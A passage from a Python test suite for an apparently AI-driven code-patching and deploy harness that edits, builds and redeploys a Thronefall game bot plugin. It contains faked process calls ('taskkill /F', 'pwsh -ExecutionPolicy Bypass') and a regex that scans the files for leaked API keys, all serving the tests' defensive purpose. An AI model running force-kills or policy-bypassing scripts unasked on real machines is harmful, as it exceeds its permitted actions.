              "g = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(8)'], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
              "print('GRANDCHILD', g.pid, flush=True)\n"
              "time.sleep(60)\n")
    results = {}

    def one(tree):
        rc, out, timed_out = me.run_cmd([sys.executable, "-c", parent], timeout=4, tree=tree)
        m = re.search(r"GRANDCHILD (\d+)", out)
        results[tree] = (rc, timed_out, int(m.group(1)) if m else 0)
    ths = [threading.Thread(target=one, args=(tree,)) for tree in (True, False)]
    for th in ths:
        th.start()
    for th in ths:
        th.join()
    time.sleep(0.5)
    survivors = [bool(results[tree][2]) and me.pid_alive(results[tree][2]) for tree in (True, False)]     # the tree=False survivor sleeps only 8 s and ends by itself - nothing is ever killed by pid here
    rc, timed_out = results[True][0], results[True][1]
    check("run_cmd: a timeout is reported (timed_out=True, rc=-1) and tree=True kills the grandchild too", timed_out is True and rc == -1 and survivors[0] is False, survivors)
    check("run_cmd: tree=False kills only the process it started - the grandchild (think: the relaunched game) survives", survivors[1] is True, survivors)
    rc, out, to = me.run_cmd([sys.executable, "-c", "print('hello')"], timeout=30)
    check("run_cmd: normal completion returns (rc, output, False); an unstartable command returns rc 127", (rc, out.strip(), to) == (0, "hello", False) and me.run_cmd(["definitely-not-a-program-xyz"], timeout=5)[0] == 127)


def test_production_hooks(tmp):
    """The default deploy/health/restore hooks with a faked process layer: NOTHING here may start or kill a real process (the game is running on this machine)."""
    base = Path(tmp) / "prod"
    repo, agent, game = base / "repo", base / "agent", base / "game"
    (repo / "tools").mkdir(parents=True)
    (repo / "tools" / "build-and-deploy.ps1").write_text("# never executed in tests\n")
    plugins = game / "BepInEx" / "plugins"
    (plugins / "agent").mkdir(parents=True)
    dll = plugins / "ThronefallTrainer.dll"
    dll.write_bytes(b"OLD")
    (game / "Thronefall_Data").mkdir()
    calls, running = [], {"state": [True, False]}                       # tasklist: running before the deploy, gone after (the script killed it)

    trees = []

    def fake_run(args, cwd=None, timeout=300, env=None, tree=True):
        calls.append([str(a) for a in args])
        trees.append(tree)
        if str(args[0]).lower() == "tasklist":
            alive = running["state"].pop(0) if running["state"] else False
            return 0, ("thronefall.exe    1234 Console" if alive else "INFO: No tasks are running which match the specified criteria."), False
        return 1, "build failed in the script", False
    saved_run, saved_which = me.run_cmd, me.shutil.which
    me.run_cmd = fake_run
    me.shutil.which = lambda n: "C:/fake/pwsh.exe" if n in ("pwsh", "powershell") else saved_which(n)
    try:
        eng = me.Engineer(str(repo), str(plugins / "agent"), lambda m, max_tokens=0: ("", {}), runner=FastRunner(), log=lambda m: None)
        check("production hooks: game_dir / deployed_dll are derived from the agent dir (<game>/BepInEx/plugins/agent)", eng.game_dir() == game and eng.deployed_dll() == dll, (eng.game_dir(), eng.deployed_dll()))
        r = eng._default_deploy()
        cmd = calls[1]
        check("default deploy: runs pwsh -NoProfile -ExecutionPolicy Bypass -File tools/build-and-deploy.ps1 from the repo root", cmd[1:5] == ["-NoProfile", "-ExecutionPolicy", "Bypass", "-File"] and cmd[5].replace("\\", "/").endswith("tools/build-and-deploy.ps1"), cmd)
        check("default deploy: a failing script that left the game DOWN (killed, not relaunched) is reported as game_down", r["ok"] is False and r["game_down"] is True and "build failed" in r["output"], r)
        check("default deploy: the script runs with tree=False, so a timeout kills only pwsh and never the game it relaunched", trees[calls.index(cmd)] is False, (trees, calls))
        running["state"] = [True, True]
        check("default deploy: a failing script with the game still running is not game_down", eng._default_deploy()["game_down"] is False)
        # restore: kill, wait, copy back with hash check - all through the faked process layer
        backup = base / "backup.dll"
        backup.write_bytes(b"GOOD")
        calls.clear()
        running["state"] = [False]
        rr = eng._default_restore(str(backup))
        flat = [" ".join(c) for c in calls]
        check("default restore: stops the game with taskkill /F /IM thronefall.exe (faked here), waits until it is gone, puts the backup DLL back and verifies the hash",
              rr["ok"] is True and dll.read_bytes() == b"GOOD" and any(c.startswith("taskkill /F /IM thronefall.exe") for c in flat) and any(c.startswith("tasklist") for c in flat), (rr, flat))
        check("default restore: no relaunch when thronefall.exe does not exist next to the game dir (nothing was started)", "relaunched" not in rr["detail"], rr)
    finally:
        me.run_cmd, me.shutil.which = saved_run, saved_which
    # health check against real files (health_timeout_s=0: one look, no sleeping)
    ag = plugins / "agent"
    h = me.Engineer(str(repo), str(ag), lambda m, max_tokens=0: ("", {}), cfg={"health_timeout_s": 0, "health_fresh_s": 20}, runner=FastRunner(), log=lambda m: None)
    since = time.time() - 5
    (ag / "audit.json").write_text("{}")
    (ag / "caps.json").write_text(json.dumps({"pid": 222, "caps": ["act.v1"]}))
    ok, detail = h._default_health({"since_t": since, "pid_before": 111})
    check("default health: audit.json fresh and caps.json rewritten by a NEW process (different pid) = healthy", ok and "caps.json new" in detail, detail)
    ok, detail = h._default_health({"since_t": since, "pid_before": 222})
    check("default health: caps.json with the same pid as before the deploy is not proof of a new process", not ok and "not rewritten by a new process" in detail, detail)
    ok, detail = h._default_health({"since_t": time.time() + 60, "pid_before": 111})
    check("default health: an audit.json older than the deploy start is the previous process", not ok and "still the previous process" in detail, detail)
    os.remove(ag / "caps.json")
    ok, detail = h._default_health({"since_t": since, "pid_before": None})
    check("default health: missing caps.json is unhealthy (health_require_caps)", not ok and "caps.json missing" in detail, detail)
    h2 = me.Engineer(str(repo), str(ag), lambda m, max_tokens=0: ("", {}), cfg={"health_timeout_s": 0, "health_require_caps": False}, runner=FastRunner(), log=lambda m: None)
    check("default health: health_require_caps=false only needs a fresh audit.json", h2._default_health({"since_t": since, "pid_before": None})[0] is True)
    os.remove(ag / "audit.json")
    check("default health: no audit.json at all is unhealthy", h2._default_health({"since_t": since, "pid_before": None})[0] is False)


def test_grounding_and_copy(tmp):
    work = Path(tmp) / "ground"
    sim.make_sandbox(work)
    (work / "src" / "Bot.cs").parent.mkdir(exist_ok=True)
    (work / "src" / "Bot.cs").write_text("class Bot {\n\tpublic static void SelectTarget(int x) { }\n\tvoid Other() { var bld_blocked = 1; }\n}\n")
    g = me.ground_task(work, {"file": "src/Bot.cs", "function": "Bot.SelectTarget", "title": "SelectTarget repeats blocked sites", "evidence": "bld_blocked=10", "fix": "skip blocked sites in pick_next"})
    check("grounding: an existing file is confirmed with its line count", "file 'src/Bot.cs' exists (4 lines)" in g, g)
    check("grounding: a symbol is located with its definition line", "symbol 'SelectTarget': defined at src/Bot.cs:2" in g, g)
    check("grounding: a snake_case evidence token is searched (and its PascalCase variant)", "symbol 'bld_blocked'" in g and "uses in src/Bot.cs(1)" in g, g)
    g = me.ground_task(work, {"file": "src/Plugins/Unstick.cs", "function": "ExecuteUnstick", "title": "x", "fix": "y"})
    check("grounding: a guessed file that does not exist is reported with similar names; unknown symbols say NOT FOUND", "does NOT exist" in g and "symbol 'ExecuteUnstick': NOT FOUND" in g, g)
    g = me.ground_task(work, {"file": "", "function": "BuildPicker.pick_next", "title": "t", "fix": ""})
    check("grounding: python-style definitions are found too", "symbol 'pick_next': defined at src/picker.py:9" in g, g)
    (work / "tools" / "_recover").mkdir(parents=True, exist_ok=True)
    (work / "tools" / "_recover" / "old.py").write_text("def pick_next(): pass\n# pick_next pick_next\n")
    (work / "tools" / "mm_engineer.py").write_text("# mentions pick_next and SelectTarget\n")
    g = me.ground_task(work, {"file": "", "function": "pick_next", "title": "t", "fix": ""})
    check("grounding: recovered copies (tools/_recover) and the engineer's own tooling never show up as places where the code lives", "_recover" not in g and "mm_engineer" not in g and "src/picker.py" in g, g)

    repo = Path(tmp) / "copyrepo"
    files = {"src/a.cs": "a", "src/obj/x.dll": "x", "src/bin/y.dll": "y", "tests/Replay/bin/z.dll": "z", "tests/Replay/obj/q.json": "q", "tests/Replay/Program.cs": "p", "tools/__pycache__/m.pyc": "m",
             "tools/m.py": "m", "tools/sub/deep.py": "d", "decompiled/a.cs": "d", "decompiled_fog/b.cs": "d", "dist/x.zip": "d", "desktop/app.cs": "d", "reference/r.txt": "d", "node_modules/n.js": "n",
             ".git/config": "g", "docs/a.md": "m", "README.md": "readme", "x.sln": "sln", "random.txt": "no", "src/huge.cs": "H" * 5000, "tests/fixtures/runs/r1/ticks.jsonl": "{}"}
    for rel, txt in files.items():
        (repo / rel).parent.mkdir(parents=True, exist_ok=True)
        (repo / rel).write_text(txt)
    cfg = dict(me.DEFAULT_CFG, max_copy_file_bytes=1000)
    dst = Path(tmp) / "copydst"
    st = me.copy_repo(repo, dst, cfg)
    got = sorted(p.relative_to(dst).as_posix() for p in dst.rglob("*") if p.is_file())
    want = sorted(["src/a.cs", "tests/Replay/Program.cs", "tools/m.py", "tools/sub/deep.py", "docs/a.md", "README.md", "x.sln", "tests/fixtures/runs/r1/ticks.jsonl"])
    check("copy_repo: copies src/tests/tools/docs + root md/sln; skips bin, obj, __pycache__, decompiled*, dist, desktop, reference, node_modules, .git, root clutter", got == want, got)
    check("copy_repo: huge files are skipped and reported", st["skipped_big"] == ["src/huge.cs"] and not (dst / "src" / "huge.cs").exists())
    check("copy_repo: copies are byte-identical", all((repo / r).read_bytes() == (dst / r).read_bytes() for r in want))
    base, work2 = Path(tmp) / "sw_base", Path(tmp) / "sw_work"
    shutil.copytree(dst, base)
    shutil.copytree(dst, work2)
    (work2 / "src" / "a.cs").write_text("edited by the model")
    (work2 / "tools" / "m.py").write_text("stray change")
    (work2 / "tools" / "new.py").write_text("stray new")
    (work2 / "docs" / "a.md").unlink()
    fixes = me.sweep_strays(base, work2, {"src/a.cs": "edit"})
    check("sweep_strays: reverts stray modified/new/deleted files but keeps the model's own edits", len(fixes) == 3 and (work2 / "src" / "a.cs").read_text() == "edited by the model" and (work2 / "tools" / "m.py").read_text() == "m" and not (work2 / "tools" / "new.py").exists() and (work2 / "docs" / "a.md").exists(), fixes)


def test_misc():
    check("tokens_of: total_tokens, then prompt+completion, then a length estimate", me.tokens_of({"total_tokens": 7}, [], "") == 7 and me.tokens_of({"prompt_tokens": 5, "completion_tokens": 6}, [], "") == 11 and me.tokens_of({}, [{"content": "x" * 400}], "y" * 400) == 200)
    check("clip: long text is cut with a truncation note, short text is unchanged", me.clip("abc", 10) == "abc" and "[truncated 90 chars]" in me.clip("x" * 100, 10))
    check("clip1: one-line clipping folds whitespace and cuts with an ellipsis", me.clip1("a\nb   c", 10) == "a b c" and me.clip1("x" * 50, 10) == "xxxxxxx..." and len(me.clip1("x" * 50, 10)) == 10)
    check("split_keepends: keeps terminators, no phantom last line", me.split_keepends(b"a\nb\n") == [b"a\n", b"b\n"] and me.split_keepends(b"a\nb") == [b"a\n", b"b"] and me.split_keepends(b"") == [])
    check("minimax chat factory: builds a callable without touching the network or printing a key", callable(me.make_minimax_chat()))
    prompt = me.render_system(dict(me.DEFAULT_CFG, max_steps=11, max_files=3))
    check("system prompt: every @PLACEHOLDER@ is filled from the config", not re.search(r"@[A-Z]+@", prompt) and "11 steps" in prompt and "max 3 files" in prompt and "at most 220 lines" in prompt, prompt[-600:])
    secret_like = re.compile(r"sk-[A-Za-z0-9_-]{20,}|eyJ[A-Za-z0-9_-]{20,}|MINIMAX_API_KEY\s*=\s*[^\s\"')]+")
    leaked = [f.name for f in (TOOLS / "mm_engineer.py", TOOLS / "engineer-sim.py", HERE / "test_mm_engineer.py") if secret_like.search(f.read_text(encoding="utf-8").replace('"MINIMAX_API_KEY="', ""))]
    check("none of the new files contains something that looks like an API key or a key assignment", not leaked, leaked)


def test_real_runner_in_sim(tmp):
    """The sandbox PyRunner (real `python -m unittest` subprocesses) and the sim script itself, end to end."""
    root = sim.make_sandbox(Path(tmp) / "pyrunner")
    r = sim.PyRunner()
    base = r.test(root)
    check("sandbox runner: real `python -m unittest` on the injected-bug repo reports exactly the 2 expected failures, with the assertion text as detail",
          sorted(base["failures"]) == ["unittest: test_picker.PickerTests.test_all_blocked_returns_none", "unittest: test_picker.PickerTests.test_skips_blocked_site"] and base["passed"] == 4
          and "AssertionError" in base["details"]["unittest: test_picker.PickerTests.test_skips_blocked_site"], base)
    p = root / "src" / "picker.py"
    p.write_text("def broken(:\n")
    bres = r.build(root)
    check("sandbox runner: a syntax error fails the build with file and line", not bres["ok"] and "src/picker.py(1" in bres["errors"][0] and "SyntaxError" in bres["errors"][0], bres)
    lines = []
    summary = sim.run_sim(True, keep=False, out=lines.append)
    text = "\n".join(lines)
    check("engineer-sim --mock end to end (real unittest runner): patched in 8 steps, the diff applies to a copy of the sandbox, and the applied tree passes all 6 tests",
          summary["status"] == "patched" and summary["steps"] == 8 and summary["verified"] is True and "BUG FIXED AND VERIFIED: True" in text and "tests in the applied tree: passed=6 failures=[]" in text, text[-500:])
    check("engineer-sim --mock report: shows the refused non-unique edit, the diff and the gates", "1 refused actions" in text and "+        if site[\"id\"] in blocked:" in text and "gates: " in text and "build" in text, text[:300])


def test_robustness(tmp):
    # path casing: Windows is case-insensitive, one file must never produce two diff entries
    ws, root = make_ws(tmp, "case")
    ws.edit("SRC/Picker.PY", "def dist(a, b):", "def dist(a, b):  # one")
    ws.edit("src/PICKER.py", "return math.hypot", "return 0 + math.hypot")
    check("path casing: different spellings of one file are canonicalised to the on-disk name (one touched entry, one diff)", list(ws.touched) == ["src/picker.py"] and ws.changed_files() == ["src/picker.py"], ws.touched)
    diff = me.make_file_diff("src/picker.py", ws.base_bytes("src/picker.py"), ws.work_bytes("src/picker.py")).decode()
    check("path casing: the exported diff uses the canonical path and contains both edits", diff.count("diff --git") == 1 and "# one" in diff and "0 + math.hypot" in diff)
    try:
        ws.safe_path("Bin/x.dll")
        check("path casing: forbidden directories are matched case-insensitively", False)
    except me.PolicyError:
        check("path casing: forbidden directories are matched case-insensitively", True)
    try:
        ws.safe_path("TOOLS/BOT-LINT.PS1", write=True)
        check("path casing: protected files are matched case-insensitively", False)
    except me.PolicyError:
        check("path casing: protected files are matched case-insensitively", True)

    # a crashing runner is feedback, not the end of the run
    class Crashy(FastRunner):
        def build(self, root, out_dir=None, timeout=None):
            raise OSError("dotnet vanished")

        def test(self, root, timeout=None):
            raise RuntimeError("runner exploded")
    env = Env(tmp, "crashy", replies=[BUILD, TEST, FIX, FINISH], runner=Crashy(), cfg={"max_steps": 4})
    env.eng.run_task("E0003")
    check("runner crash: the model is told (BUILD FAILED / TESTS FAILED with the cause) and the run goes on instead of dying", "BUILD FAILED" in env.obs(2) and "dotnet vanished" in env.obs(2) and "runner exploded" in env.obs(3), (env.obs(2)[:200], env.obs(3)[:200]))
    check("runner crash: a finish with a crashing build is refused, the run ends as failed (not as an internal error)", "FINISH REFUSED" in env.obs(5 if len(env.chat.calls) >= 5 else 4) or env.rec()["status"] == "failed", env.rec().get("error"))
    check("runner crash: the sidecar says failed with a clean reason", env.rec()["status"] == "failed" and "internal error" not in env.rec()["error"], env.rec().get("error"))

    # a file that cannot be copied (locked by another writer) is retried, then the run stops cleanly instead of working on a half-copied tree
    env = Env(tmp, "copyfail", replies=list(HAPPY))
    real_copy2, tries = me.shutil.copy2, []

    def flaky(s, d, *a, **k):
        if str(s).replace("\\", "/").endswith("src/picker.py"):
            tries.append(s)
            raise PermissionError("[WinError 32] file in use")
        return real_copy2(s, d, *a, **k)
    me.shutil.copy2 = flaky
    saved_sleep = me.time.sleep
    me.time.sleep = lambda s: None
    try:
        res = env.eng.run_task("E0003")
    finally:
        me.shutil.copy2, me.time.sleep = real_copy2, saved_sleep
    check("copy failure: a locked source file is retried 3 times, then the run fails cleanly with the file named (no model call, no half-copied workspace)",
          res["status"] == "failed" and len(tries) == 3 and "workspace copy incomplete" in env.rec()["error"] and "src/picker.py" in env.rec()["error"] and not env.chat.calls and env.rec()["status"] == "failed", (res, len(tries)))
    env.eng.requeue("E0003")
    res = env.eng.run_task("E0003")
    check("copy failure: after the lock is gone, requeue + run works", res["status"] == "patched", res)

    # workspace cleanup keeps the newest N
    tasks = [dict(sim.TASK, id="E%04d" % i, t=100.0 + i, title="task %d" % i, function="Fn%d" % i) for i in range(1, 5)]
    env = Env(tmp, "cleanup", replies=[{"action": "finish", "no_change": True, "summary": "n/a"}] * 4, tasks=tasks, cfg={"keep_workspaces": 2})
    for t in tasks:
        env.eng.run_task(t["id"])
        time.sleep(0.05)
    kept = sorted(p.name for p in (env.agent / "engineer" / "work").iterdir())
    check("cleanup: only the newest keep_workspaces (2) workspaces are kept", kept == ["E0003", "E0004"], kept)
    check("attempts: every run increments the task's attempt counter; requeue resets it", env.rec("E0004")["attempts"] == 1 and env.eng.requeue("E0004")["ok"] and env.rec("E0004")["attempts"] == 0)
    force = env.eng.run_task("E0003")
    check("run_task refuses a task that is not queued unless forced", force["ok"] is False and "not queued" in force["error"])

    # conflict -> the documented recovery: the task is queued again and a re-run builds a fresh patch against the current tree
    env = patched_env(tmp, "reconflict")
    real, eng_real = env.real()
    p = real / "src" / "picker.py"
    p.write_text(p.read_text().replace("    for site in sites:\n", "    for site in list(sites):  # other agent edit\n"))
    check("conflict recovery: first apply conflicts", eng_real.apply_patch("E0003")["status"] == "conflict" and env.rec()["status"] == "queued")
    new_old = sim.FIX_OLD.replace("for site in sites:", "for site in list(sites):  # other agent edit")
    env.chat.replies = [{"action": "edit", "path": "src/picker.py", "old": new_old, "new": sim.FIX_NEW.replace("for site in sites:", "for site in list(sites):  # other agent edit")}, BUILD, TEST, FINISH]
    res = eng_real.run_task("E0003")
    check("conflict recovery: re-running the task works on the CURRENT real tree (it sees the other agent's change) and produces a new patch", res["status"] == "patched" and env.rec()["attempts"] == 2, res)
    res = eng_real.apply_patch("E0003")
    check("conflict recovery: the new patch applies cleanly and keeps the other agent's edit", res["ok"] and "# other agent edit" in p.read_text() and 'if site["id"] in blocked' in p.read_text(), res)

    # API pre-checks
    env = patched_env(tmp, "api_pre")
    real, eng = env.real()
    code, r = eng.api_post("/engineer/run", {"id": "E0003"})
    check("api: starting a run on a patched task is a synchronous 409 (wrong status), no thread is started", code == 409 and "run needs a task in status queued" in r["error"] and eng.thread is None)
    code, r = eng.api_post("/engineer/deploy", {"id": "E0003", "confirm": True})
    check("api: deploying a task that is not applied is a 409", code == 409 and "applied" in r["error"])
    code, r = eng.api_post("/engineer/apply", {"id": "E0003"})
    eng.thread.join(30)
    check("api: apply on a patched task answers 202 and runs in a thread", code == 202 and r["op"] == "apply" and env.rec()["status"] == "applied", (code, r))
    code, r = eng.api_post("/engineer/deploy", {"id": "E0003"})
    check("api: deploy without confirm:true is a 409 'confirmation required' (nothing is started)", code == 409 and "confirmation required" in r["error"] and env.deployer.deploys == 0)
    code, r = eng.api_post("/engineer/deploy", {"id": "E0003", "confirm": "true"})
    check("api: confirm must be the JSON boolean true (the string 'true' is not accepted)", code == 409 and env.deployer.deploys == 0)
    code, r = eng.api_post("/engineer/deploy", {"id": "E0003", "confirm": True})
    eng.thread.join(30)
    check("api: deploy with confirm:true answers 202 and deploys in a thread", code == 202 and env.rec()["status"] == "deployed" and env.deployer.deploys == 1, (code, r, env.rec()["status"]))
    check("api: a bad ?n= value does not break GET /engineer/queue", eng.api_get("/engineer/queue?n=abc")[0] == 200 and eng.api_get("/engineer/log?id=E0003&n=%")[0] == 200)


def test_minimax_chat_local(tmp):
    """make_minimax_chat against a LOCAL fake endpoint (no network, no real key): request shape, retry, error handling, no key leakage."""
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
    seen, script = [], []

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_POST(self):
            n = int(self.headers.get("Content-Length") or 0)
            seen.append({"auth": self.headers.get("Authorization"), "body": json.loads(self.rfile.read(n) or b"{}"), "path": self.path})
            code, body = script.pop(0)
            data = json.dumps(body).encode()
            self.send_response(code)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
    srv = ThreadingHTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    url = "http://127.0.0.1:%d/v1/chat/completions" % srv.server_address[1]
    old_env = os.environ.get("MM_KEY_OVERRIDE")
    os.environ["MM_KEY_OVERRIDE"] = "KEY-SENTINEL-9f3a"
    try:
        chat = me.make_minimax_chat(timeout=5, retries=1, url=url)
        script.append((200, {"choices": [{"message": {"content": '{"action":"ls"}', "reasoning_content": "secret thoughts"}}], "usage": {"total_tokens": 42}}))
        content, usage = chat([{"role": "user", "content": "hi"}], max_tokens=8000)
        b = seen[-1]["body"]
        check("minimax chat: returns (content, usage) and sends the same request shape as coach-server (model, 8000 tokens, reasoning_split, temperature 0.3, bearer key)",
              content == '{"action":"ls"}' and usage == {"total_tokens": 42} and b["max_tokens"] == 8000 and b["reasoning_split"] is True and b["temperature"] == 0.3 and b["model"] == "MiniMax-M3" and b["stream"] is False
              and seen[-1]["auth"] == "Bearer KEY-SENTINEL-9f3a" and seen[-1]["path"] == "/v1/chat/completions", (content, b))
        script.append((200, {"choices": [{"message": {"content": "", "reasoning_content": "half-formed thoughts"}}]}))
        script.append((200, {"choices": [{"message": {"content": "", "reasoning_content": "half-formed thoughts"}}]}))
        try:
            chat([{"role": "user", "content": "hi"}])
            check("minimax chat: a reasoning-only reply is an error, never returned as content", False)
        except RuntimeError as ex:
            check("minimax chat: a reasoning-only reply is an error, never returned as content", "empty MiniMax reply" in str(ex), ex)
        n0 = len(seen)
        script.append((500, {"error": "boom"}))
        script.append((200, {"choices": [{"message": {"content": "ok after retry"}}], "usage": {}}))
        content, _u = chat([{"role": "user", "content": "hi"}])
        check("minimax chat: one retry after an HTTP error (retries=1)", content == "ok after retry" and len(seen) - n0 == 2)
        script.append((401, {"error": "bad key KEY-SENTINEL-9f3a"}))
        script.append((401, {"error": "bad key KEY-SENTINEL-9f3a"}))
        try:
            chat([{"role": "user", "content": "hi"}])
            check("minimax chat: persistent HTTP errors raise", False)
        except RuntimeError as ex:
            check("minimax chat: persistent HTTP errors raise a short error that never contains the key or the response body", str(ex) == "MiniMax HTTP 401" and "KEY-SENTINEL" not in str(ex), ex)
        script.append((200, {"unexpected": True}))
        script.append((200, {"unexpected": True}))
        try:
            chat([{"role": "user", "content": "hi"}])
            check("minimax chat: a body without choices raises", False)
        except RuntimeError as ex:
            check("minimax chat: a body without choices raises a clean error", "bad response" in str(ex) and "KEY-SENTINEL" not in str(ex), ex)
        saved = me.mm_key
        me.mm_key = lambda: ""
        try:
            chat([{"role": "user", "content": "hi"}])
            check("minimax chat: a missing key raises before any request", False)
        except RuntimeError as ex:
            check("minimax chat: a missing key raises before any request", "MINIMAX_API_KEY missing" in str(ex))
        finally:
            me.mm_key = saved
    finally:
        srv.shutdown()
        if old_env is None:
            os.environ.pop("MM_KEY_OVERRIDE", None)
        else:
            os.environ["MM_KEY_OVERRIDE"] = old_env
    check("minimax chat: the factory result is a drop-in for Engineer(mm_chat=...) (signature chat(messages, max_tokens))", callable(me.make_minimax_chat()) and me.make_minimax_chat().__code__.co_varnames[:2] == ("messages", "max_tokens"))


def main():
    tmp = tempfile.mkdtemp(prefix="test-mm-engineer-")
    try:
        for name, fn, takes_tmp in (("path policy", test_path_policy, True), ("workspace edit", test_workspace_edit_semantics, True), ("workspace read/grep/ls/create", test_workspace_read_grep_ls_create, True),
                                    ("workspace limits", test_workspace_limits, True), ("diff export", test_diff_export, True), ("safety scan", test_safety_scan, True), ("protocol", test_protocol, False),
                                    ("happy path", test_happy_path, True), ("crlf+tabs loop", test_crlf_tabs_loop, True), ("conversation", test_conversation_bounded, True), ("protocol failures", test_protocol_failures, True), ("limits", test_limits, True),
                                    ("real git repo autocrlf", test_real_git_repo_autocrlf, True), ("sidecar races", test_sidecar_races, True), ("fuzz", test_fuzz_model_output, True), ("soak", test_soak_random_runs, True), ("action crash", test_action_crash_is_contained, True), ("model errors", test_model_errors, True), ("gate feedback", test_gate_feedback, True), ("hygiene/server", test_hygiene_and_server, True), ("concurrency", test_concurrency, True),
                                    ("apply", test_apply, True), ("deploy", test_deploy, True), ("queue/status", test_queue_and_status, True), ("same target", test_same_target, True), ("config", test_config, True), ("autorun", test_autorun, True),
                                    ("api", test_api, True), ("recovery/cli", test_recovery_and_cli, True), ("runner", test_runner, True), ("run_cmd timeouts", test_run_cmd_timeouts, True), ("production hooks (faked processes)", test_production_hooks, True), ("grounding/copy", test_grounding_and_copy, True),
                                    ("robustness", test_robustness, True), ("minimax chat (local fake endpoint)", test_minimax_chat_local, True),
                                    ("misc", test_misc, False), ("sandbox runner", test_real_runner_in_sim, True)):
            print("\n--- %s" % name)
            t = time.time()
            try:
                fn(tmp) if takes_tmp else fn()
            except Exception as ex:
                import traceback
                traceback.print_exc()
                check("%s: raised %s" % (name, type(ex).__name__), False, ex)
            print("    (%.1fs)" % (time.time() - t))
    finally:
        me.rmtree_force(tmp)
    print("\n%s - %d checks, %d failed, %.1fs" % ("ALL PASSED" if not FAILS else "FAILED", COUNT[0], len(FAILS), time.time() - T0))
    for f in FAILS:
        print("  FAILED:", f)
    return 1 if FAILS else 0


if __name__ == "__main__":
    sys.exit(main())
